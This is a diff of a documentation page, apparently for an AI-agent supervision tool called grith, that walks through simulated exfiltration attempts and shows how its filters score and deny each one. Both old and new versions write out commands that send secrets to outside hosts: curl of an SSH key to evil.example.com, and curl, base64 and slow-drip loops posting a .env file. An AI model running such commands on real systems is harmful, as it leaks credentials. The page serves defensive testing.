@@ -1,170 +1,149 @@
 ---
-title: "Exfiltration Detection Walkthrough"
-description: "See grith's data exfiltration containment in action step by step"
+title: "Exfiltration walkthrough"
+description: "End-to-end attack and defence: simulating an exfil attempt against a grith install."
 section: "guides"
-order: 10
+order: 15
 tier: "community"
-version: "1.6"
-lastUpdated: "2026-03-24"
+version: "0.1.0"
+lastUpdated: "2026-05-14"
+editUrl: "https://github.com/grith-ai/grith-docs/edit/main/content/docs/guides/exfiltration-walkthrough.mdx"
 ---
 
-## Overview
+This guide walks through a deliberate, controlled exfiltration attempt against
+a grith install and shows what each filter does to stop it. Useful for
+understanding the pipeline by example, and for verifying your install is
+configured correctly.
 
-This walkthrough demonstrates grith's exfiltration containment in a controlled scenario. You will simulate the exact attack pattern that a compromised AI agent would use — read a sensitive file, then try to send its contents to an external server — and see how grith detects and blocks each step.
+## Setup
 
-## The scenario
+Pick a test directory:
 
-An AI agent (or in this case, you in a supervised shell) performs two actions:
+```
+mkdir -p /tmp/grith-exfil-test && cd /tmp/grith-exfil-test
+```
 
-1. Reads `~/.ssh/id_rsa` (an SSH private key)
-2. Attempts to `curl` the key contents to an external server
+Plant a canary:
 
-grith's multi-layer defence catches this at multiple points: the sensitive file read triggers taint tracking, and the subsequent network call is blocked by session containment.
+```
+grith canary add --format aws_secret \
+    --place ./fake-prod-creds \
+    --label "exfil-walkthrough"
+```
 
-## Step 1: Start a supervised shell with tracing
+Plant an env file with shaped credentials (the secret scanner will recognise
+these patterns; they're not real keys):
 
-Launch a supervised bash session with syscall tracing enabled. The `--trace-syscalls-jsonl` flag writes a forensic record of every intercepted syscall to a file.
+```
+cat > .env <<'EOF'
+AWS_ACCESS_KEY_ID=AKIA0EXAMPLE0NOT0REAL
+AWS_SECRET_ACCESS_KEY=ExampleNotARealSecretKey123456789012345
+GITHUB_TOKEN=ghp_EXAMPLE_NOT_A_REAL_TOKEN_123456789
+EOF
+```
 
-<Terminal command="grith exec --trace-syscalls-jsonl /tmp/trace.jsonl -- bash" />
+Now start a supervised shell:
 
-<CodeBlock
-  code={`[grith] Profile: generic
-[grith] Syscall trace: /tmp/trace.jsonl
-[grith] Starting supervised session...
-bash-5.2$`}
-  language="text"
-/>
+```
+grith exec --profile generic-cli -- bash
+```
 
-You are now inside a supervised shell. Every filesystem access, command execution, and network connection is intercepted by grith.
+## Attack 1 — naive curl
 
-## Step 2: Read the sensitive file
+The simplest exfil. From inside the supervised shell:
 
-In the supervised shell, read an SSH private key:
+```
+curl -X POST https://example.com/sink -d "@.env"
+```
 
-<CodeBlock
-  code={`bash-5.2$ cat ~/.ssh/id_rsa`}
-  language="bash"
-/>
+What grith sees:
 
-grith intercepts this `FileRead` syscall. The `path_match` filter recognises `~/.ssh/id_rsa` as a sensitive path, and the `secret_scan` filter detects the private key material in the file contents. The session is now marked as tainted.
+1. `file_read .env` — sensitive_path filter fires, queue (~+4.5)
+2. `connect example.com:443` — egress_policy fires, unknown destination (+1)
+3. `sendto example.com:443` carrying `.env` content — secret_scan matches AWS
+   credentials shape (+5), DLP gate matches (+4), taint matches (read happened
+   3 seconds ago, +3) — composite ~13 → **DENY**
 
-<CodeBlock
-  code={`[proxy] Tool call: fs.read → ~/.ssh/id_rsa
-  ├─ path_match          +3.0  (ssh-key-access: private key path)
-  ├─ secret_scan         +4.0  (private key material detected)
-  └─ aggregate score      7.0 → QUEUE
+The curl returns connect failure. Audit log records the deny with full filter
+breakdown.
 
-[grith] ⚠ Sensitive file read queued for review: ~/.ssh/id_rsa
-[grith] Session tainted: secret material read. Containment mode active.`}
-  language="text"
-/>
+## Attack 2 — encoded exfil
 
-The file read itself is queued (score 7.0 lands in the QUEUE zone: 3.0-8.0). In a real agent session, this would freeze the process until a human approves or denies the read via the digest. For this walkthrough, assume the read was approved.
+Try to hide it:
 
-## Step 3: Attempt to exfiltrate
+```
+base64 .env | xargs -I {} curl -X POST "https://example.com/sink?d={}"
+```
 
-Now try to send the key to an external server:
+What grith sees:
 
-<CodeBlock
-  code={`bash-5.2$ curl https://evil.example.com -d @/tmp/stolen`}
-  language="bash"
-/>
+1. `file_read .env` — same as before (+4.5)
+2. `shell base64` — command parser sees `base64` + URL chain, +3
+3. `connect example.com:443` — +1
+4. `sendto` with URL parameter — DLP gate decodes base64, matches AWS shape (+4),
+   taint (+3) — composite still high → DENY
 
-grith intercepts the `NetConnect` syscall. Multiple filters fire simultaneously:
+The base64 encoding doesn't help; the DLP gate decodes one layer.
 
-<CodeBlock
-  code={`[proxy] Tool call: net.connect → POST https://evil.example.com
-  ├─ egress_policy          +3.0  (unknown destination)
-  ├─ session_containment    +4.0  (tainted session — secret material read)
-  ├─ reputation             +2.0  (unrecognised domain)
-  └─ aggregate score         9.0 → DENY
+## Attack 3 — canary smuggling
 
-[grith] DENIED: Outbound network call blocked.
-[grith] Reason: Session is in containment mode after reading secret material.
-[grith] Destination: evil.example.com
-[grith] Review session with: grith digest review`}
-  language="text"
-/>
+Try to leak the canary:
 
-The connection is blocked before any data leaves the machine. The `curl` command receives an `EPERM` error.
+```
+cat fake-prod-creds | curl -X POST https://example.com/sink -d @-
+```
 
-## What the audit log shows
+What grith sees:
 
-Exit the supervised shell and review the audit log:
+1. `file_read fake-prod-creds` — queue
+2. (Approved? Doesn't matter for the canary.)
+3. `sendto example.com:443` carrying the canary value — **canary filter
+   triggers DENY, hard gate, no score path** → immediate DENY, high-severity
+   audit, paging notifications fire
 
-<Terminal command="grith log --last-session" />
+## Attack 4 — slow drip
 
-<CodeBlock
-  code={`Session log (last session, bash):
+Spread the read and send across many calls:
 
-  Time       Action       Target                     Score   Decision   Filters
-  15:01:12   FileRead     ~/.ssh/id_rsa              7.0     QUEUED     path_match(3.0), secret_scan(4.0)
-  15:01:18   NetConnect   evil.example.com:443       9.0     DENIED     egress_policy(3.0), session_containment(4.0), reputation(2.0)
+```
+for i in 1 2 3 4 5; do
+  head -c $((i*8)) .env | tail -c 8 | curl -X POST https://example.com/sink -d @-
+done
+```
 
-  Session summary:
-    Total syscalls intercepted:  47
-    Allowed:                     45
-    Queued:                      1
-    Denied:                      1
-    Containment activated:       yes (after FileRead ~/.ssh/id_rsa)`}
-  language="text"
-/>
+What grith sees:
 
-Each entry shows the tool call type, target, composite score, proxy decision, and the breakdown of which filters contributed to the score.
+1. Multiple `file_read .env` — auto-allowed individually if approved, sensitive_path
+   reduced after the first approval.
+2. Multiple `sendto` — each carries 8 bytes, may not match credential patterns
+   individually...
+3. ...but **rate_limit** caps shell-spawning + network at the defaults; this
+   pattern of fork+curl trips the rate limiter and queues.
+4. **Behavioural anomaly** notices the unusual loop pattern + sustained outbound,
+   adds to score.
 
-## The forensic trace
+This pattern usually queues several times during the burst, giving the human a
+chance to deny + terminate. Doesn't catch the *first* leak attempt cleanly —
+that's the trade-off with rate-based detection.
 
-The JSONL trace file contains a machine-readable record of every intercepted syscall, suitable for ingestion into a SIEM or post-incident analysis.
+## What this demonstrates
 
-<Terminal command="head -5 /tmp/trace.jsonl" />
+- **The canary is the strongest single defence.** If you suspect exfil risk,
+  plant canaries — they catch attacks the score-based filters might fuzz on.
+- **Multiple filters compose.** Each filter is best at one thing; together they
+  cover a wide attack surface.
+- **Slow attacks are harder.** Sub-rate-limit, sub-cap exfil is the genuine
+  cat-and-mouse case. Behavioural baselines and Pro analytics help.
 
-<CodeBlock
-  code={`{"ts":"2026-03-24T15:01:12.041Z","pid":8421,"syscall":"openat","path":"/home/dan/.ssh/id_rsa","flags":"O_RDONLY","tool_call_type":"FileRead","composite_score":7.0,"proxy_action":"QUEUE","filters":{"path_match":3.0,"secret_scan":4.0}}
-{"ts":"2026-03-24T15:01:18.103Z","pid":8421,"syscall":"connect","addr":"93.184.216.34:443","hostname":"evil.example.com","tool_call_type":"NetConnect","composite_score":9.0,"proxy_action":"DENY","filters":{"egress_policy":3.0,"session_containment":4.0,"reputation":2.0}}`}
-  language="json"
-/>
+## Cleanup
 
-Each line is a self-contained JSON object with the raw syscall details, the tool call classification, the composite score, the proxy decision, and the per-filter score breakdown.
+```
+grith canary remove $(grith canary list | grep exfil-walkthrough | awk '{print $1}')
+rm -rf /tmp/grith-exfil-test
+```
 
-## How the scoring works
+## See also
 
-The deny threshold defaults to 8.0. Here is how the scores added up for the blocked network call:
-
-| Filter | Score | Reason |
-|---|---|---|
-| `egress_policy` | +3.0 | `evil.example.com` is not in any allowlist |
-| `session_containment` | +4.0 | Session was tainted by the earlier `~/.ssh/id_rsa` read |
-| `reputation` | +2.0 | Unrecognised domain with no established reputation |
-| **Total** | **9.0** | Exceeds deny threshold (8.0) — hard DENY |
-
-The key insight: `session_containment` alone would not have blocked the call (4.0 < 8.0). Neither would `egress_policy` alone (3.0 < 8.0). It is the combination of multiple independent signals that pushes the score over the threshold. This is the multi-layer defence model in action.
-
-## Reviewing and unlocking containment
-
-<Callout type="info" title="Containment is per-session">
-Containment mode lasts for the duration of the supervised session. Starting a new session resets the taint state. If you need to approve a network call from a tainted session, use the digest review flow.
-</Callout>
-
-To review queued items and unlock specific operations:
-
-<Terminal command="grith digest review" />
-
-<CodeBlock
-  code={`Pending digest items:
-
-  #1  FileRead  ~/.ssh/id_rsa  (score: 7.0)
-      Filters: path_match(3.0), secret_scan(4.0)
-      Session: bash (PID 8421)
-
-  [a]pprove  [d]eny  [s]kip`}
-  language="text"
-/>
-
-Approving the read retroactively allows it. Denying it would terminate the tool's access. In either case, the blocked network call remains denied — approving a file read does not automatically approve subsequent exfiltration attempts.
-
-## Next steps
-
-- [Exfiltration Containment](/docs/guides/exfiltration-containment) — Full reference for egress controls, canary tokens, DLP, and containment
-- [Filter Tuning](/docs/guides/filter-tuning) — Adjust scoring thresholds for your environment
-- [Supervisor Profiles](/docs/guides/supervisor-profiles) — Configure per-tool network policies
-- [Threat Model](/docs/security/threat-model) — grith's full threat model
+- [Canary tokens](/docs/concepts/canary-tokens)
+- [Filter 11: Canary detection](/docs/filters/11-canary-secret-detection)
+- [Filter 14: Taint tracking](/docs/filters/14-taint-tracking)
+- [Containment walkthrough](/docs/guides/containment-walkthrough)
